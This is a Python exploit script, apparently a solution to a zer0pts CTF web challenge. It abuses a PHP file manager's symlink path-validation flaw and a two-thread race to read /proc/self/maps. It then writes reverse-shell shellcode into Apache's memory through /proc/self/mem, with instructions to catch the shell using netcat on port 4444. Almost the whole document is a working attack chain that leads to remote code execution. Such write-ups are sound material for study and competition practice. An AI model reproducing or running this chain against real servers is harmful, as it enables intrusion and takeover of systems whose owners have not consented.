#!/usr/bin/env python3

import requests
import threading
from time import sleep
import hashlib

sess1 = {"PHPSESSID":"qweqweqweqwe"}
sess2 = {"PHPSESSID":"asdasdasdasd"}
#url = "http://localhost:8080/"
url = "http://any.ctf.zer0pts.com:9080/"

def create(name, mode, target="", cookies=sess1):
    if mode:
        conn = requests.post(url, cookies=cookies, data={"mode":"create", "name":name, "type":str(mode) ,"target":target})
    else:
        conn = requests.post(url, cookies=cookies, data={"mode":"create", "name":name})

def read(filename, offset=0, cookies=sess1):
    conn = requests.post(url, cookies=cookies, data={"mode":"read", "name":filename, "offset":offset})
    r1 = conn.text
    #print(r1)
    f = open("log.txt","wb+")
    f.write(r1.encode())
    f.write(b"\n\n")
    f.close()

def write(filename, msg, offset=0, cookies=sess1):
    conn = requests.post(url, cookies=cookies, data={"mode":"write","data":msg,"name":filename, "offset":str(offset)})
    print(conn.text)

def delete(dest, cookies=sess1):
    conn = requests.post(url, cookies=cookies, data={"mode":"delete", "name":dest})

def leak_maps():
    cookie2_md5 = hashlib.md5(sess2["PHPSESSID"].encode()).hexdigest()

    # Delete any existing files of this name
    delete("file", sess1)
    delete("flag", sess1)
    delete("maps", sess1)
    delete("file", sess2)
    delete("flag", sess2)
    delete("maps", sess2)

    # ========= SESSION 2 ===========
    # Create a "maps" file and make its size huge because /proc/self/maps is
    # huge (because apache is beefy af)
    create("maps", 0, "", sess2)
    write("maps", "A"*0xa0000, 0, sess2)

    # Create a symlink to "maps" called "file"
    create("file", 1, "maps", sess2)

    # ========= SESSION 1 ===========
    # Create a file called "flag"
    create("flag", 0)

    # Create a symlink to "flag" called "file"
    create("file", 1, "flag")

    # Delete "flag". Now if you check the directory with ls -l, you will see
    # that "file" is actually "file -> flag" even though "flag" doesn't exist
    delete("flag")

    # Create a symlink with target = "../md5(SESS2_PHPSESSID)/file". This works
    # now because `@readlink("file")` in `create()` will return "flag", which
    # passes the `validate_filepath()` checks. The symlink is still created.
    create("file", 1, "../" + cookie2_md5 + "/file")

    # Now we need two threads for the race, check each function's code below.
    # Note that the race window is small, we had to use a server in europe to
    # get lower latency (i couldnt get leaks locally). Play around with the
    # sleep in func2() (and maybe add a sleep in func1() idk) to get it to work
    # on your machine.
    t1 = threading.Thread(target=func1);
    t2 = threading.Thread(target=func2);

    t1.start()
    t2.start()

    t1.join()
    t2.join()

# In thread 1, we use session 1. We just read the file. This will read and go
# into a sleep for 0.5 seconds.
def func1():
    read("file")

# During the sleep from above, we delete the "maps" file in session 2, and
# replace the "file" symlink with "/proc/self/maps" (using the same bug as
# we used above to point session 1's "file" to session 2's "file").
#
# Finally, after the sleep in func1() finishes, it will read /proc/self/maps
# and send us the leaks.
def func2():
    sleep(0.1)
    delete("maps", sess2)
    create("file", 1, "../../../../../proc/self/maps", sess2)

def rce():
    delete("file")
    delete("flag")
    delete("maps")

    # Reverse shell shellcode, u just replace this with reverse shell that u
    # want, compiled with nasm -fbin
    sc = None
    with open("./shell.bin", "rb") as f:
        sc = f.read()

    # Get a handle to /proc/self/mem using the same bugs explained in
    # leak_maps()
    create("flag", 0)
    create("file", 1, "flag")
    delete("flag")
    create("file", 1, "../../../../../proc/self/mem")

    # Overwrite libpthread's r-x section offset 0x320 with shellcode. This
    # offset was found using manual binary search locally :megajoy:
    #
    # It will cause the apache process to crash, and subsequently send a
    # reverse shell that you can catch with nc -lvnp 4444
    write("file", sc, 0x7f6a7f8e3320)

if __name__ == "__main__":
    #leak_maps() # Use this to get leaks, only need to do this once
    rce() # sice
